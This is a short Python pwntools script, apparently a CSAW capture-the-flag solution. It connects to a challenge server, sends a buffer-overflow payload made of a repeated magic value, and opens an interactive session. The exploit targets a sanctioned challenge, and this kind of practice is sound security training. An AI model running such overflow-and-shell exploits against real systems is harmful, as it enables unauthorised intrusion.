from pwn import *

r = remote('pwn.chal.csaw.io', 9000)
payload = "\xEE\xBA\xF3\xCA"*50
data = r.recvrepeat(1)
print(data)
r.sendline(payload)
data = r.recvrepeat(1)
print(data)
r.interactive()
